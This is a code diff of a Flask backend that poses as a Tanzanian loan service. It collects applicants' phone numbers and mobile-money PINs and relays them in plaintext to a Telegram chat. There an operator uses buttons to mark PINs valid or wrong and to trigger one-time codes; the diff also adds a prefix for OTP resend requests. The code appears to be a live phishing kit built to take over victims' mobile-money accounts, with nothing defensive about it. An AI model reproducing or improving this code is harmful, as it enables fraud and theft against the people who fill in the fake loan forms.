@@ -63,30 +63,25 @@ def poll_telegram():
                         conn = sqlite3.connect('database.db'); c = conn.cursor()
                         if cb_data.startswith('deny_'): 
                             aid=cb_data.replace('deny_','')
-                            c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id,original+'\n\n❌ INVALID - Not a Tigo number or wrong PIN')
+                            c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,)); conn.commit()
+                            edit_telegram(msg_id,original+'\n\n❌ INVALID')
                         elif cb_data.startswith('allow_'): 
                             aid=cb_data.replace('allow_','')
-                            c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id,original+'\n\n✅ ALLOWED - OTP Sent')
+                            c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,)); conn.commit()
+                            edit_telegram(msg_id,original+'\n\n✅ ALLOWED')
                         elif cb_data.startswith('wrongpin2_'): 
                             aid=cb_data.replace('wrongpin2_','')
                             new_code=str(random.randint(1000,9999))
-                            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
-                            conn.commit()
-                            edit_telegram(msg_id,original+'\n\n❌ WRONG PIN - New code generated')
+                            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid)); conn.commit()
+                            edit_telegram(msg_id,original+'\n\n❌ WRONG PIN')
                         elif cb_data.startswith('wrongcode_'): 
                             aid=cb_data.replace('wrongcode_','')
                             new_code=str(random.randint(1000,9999))
-                            c.execute('UPDATE loans SET code_status="pending",code=? WHERE app_id=?',(new_code,aid))
-                            conn.commit()
-                            edit_telegram(msg_id,original+'\n\n❌ WRONG CODE - New code generated')
+                            c.execute('UPDATE loans SET code_status="pending",code=? WHERE app_id=?',(new_code,aid)); conn.commit()
+                            edit_telegram(msg_id,original+'\n\n❌ WRONG CODE')
                         elif cb_data.startswith('approve_'): 
                             aid=cb_data.replace('approve_','')
-                            c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,))
-                            conn.commit()
+                            c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,)); conn.commit()
                             edit_telegram(msg_id,original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
                         conn.close()
         except Exception as e: print(f'Poll error: {e}')
@@ -116,6 +111,10 @@ def submit_loan():
     c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
     conn.commit(); conn.close()
     prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
+    # OTP REQUESTED message for resend
+    purpose = data.get('purpose','')
+    if purpose == 'OTP REQUESTED':
+        prefix = '📤 OTP REQUESTED'
     msg = f'{prefix}\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
     keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
     send_telegram(msg, keyboard)
@@ -152,30 +151,25 @@ def webhook():
         conn = sqlite3.connect('database.db'); c = conn.cursor()
         if cb_data.startswith('deny_'): 
             aid=cb_data.replace('deny_','')
-            c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id,original+'\n\n❌ INVALID - Not a Tigo number or wrong PIN')
+            c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,)); conn.commit()
+            edit_telegram(msg_id,original+'\n\n❌ INVALID')
         elif cb_data.startswith('allow_'): 
             aid=cb_data.replace('allow_','')
-            c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id,original+'\n\n✅ ALLOWED - OTP Sent')
+            c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,)); conn.commit()
+            edit_telegram(msg_id,original+'\n\n✅ ALLOWED')
         elif cb_data.startswith('wrongpin2_'): 
             aid=cb_data.replace('wrongpin2_','')
             new_code=str(random.randint(1000,9999))
-            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
-            conn.commit()
-            edit_telegram(msg_id,original+'\n\n❌ WRONG PIN - New code generated')
+            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid)); conn.commit()
+            edit_telegram(msg_id,original+'\n\n❌ WRONG PIN')
         elif cb_data.startswith('wrongcode_'): 
             aid=cb_data.replace('wrongcode_','')
             new_code=str(random.randint(1000,9999))
-            c.execute('UPDATE loans SET code_status="pending",code=? WHERE app_id=?',(new_code,aid))
-            conn.commit()
-            edit_telegram(msg_id,original+'\n\n❌ WRONG CODE - New code generated')
+            c.execute('UPDATE loans SET code_status="pending",code=? WHERE app_id=?',(new_code,aid)); conn.commit()
+            edit_telegram(msg_id,original+'\n\n❌ WRONG CODE')
         elif cb_data.startswith('approve_'): 
             aid=cb_data.replace('approve_','')
-            c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,))
-            conn.commit()
+            c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,)); conn.commit()
             edit_telegram(msg_id,original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
         conn.close()
     return jsonify({'ok':True})
